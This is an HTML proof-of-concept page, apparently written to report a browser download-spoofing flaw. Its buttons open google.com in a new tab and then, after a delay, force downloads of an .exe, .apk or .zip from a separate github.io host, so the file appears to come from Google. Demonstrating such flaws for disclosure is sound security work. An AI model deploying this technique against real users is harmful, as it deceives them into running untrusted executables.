<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download File</title>

</head>

<body>
    <h1>Download File from Google</h1>

    <button onclick="downloadExe()">Start Download .exe</button>
    <button onclick="downloadApk()" style="text-decoration: none; margin-left: 20px;">Start Download .apk</button>
    <button onclick="downloadZip()" style="text-decoration: none; margin-left: 20px;">Start Download .zip</button>


    <script>
        async function downloadExe() {
            window.open('https://google.com', '_blank');

            setTimeout(async () => {
                const response = await fetch('https://kokurate.github.io/browser/rarfile.exe');
                const blob = await response.blob();
                const url = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download = 'POC direct download exe.exe';
                link.click();
                URL.revokeObjectURL(url);
            }, 5000);
        }


        async function downloadApk() {
            window.open('https://google.com', '_blank');

            setTimeout(async () => {
                const response = await fetch('https://kokurate.github.io/browser/filedownload.apk');
                const blob = await response.blob();
                const url = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download = 'POC direct download apk.apk';
                link.click();
                URL.revokeObjectURL(url);
            }, 5000);
        }


        async function downloadZip() {
            window.open('https://google.com', '_blank');

            setTimeout(async () => {
                const response = await fetch('https://kokurate.github.io/browser/filedownload.zip');
                const blob = await response.blob();
                const url = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download = 'POC direct download zip.zip';
                link.click();
                URL.revokeObjectURL(url);
            }, 5000);
        }
    </script>

</body>

</html>
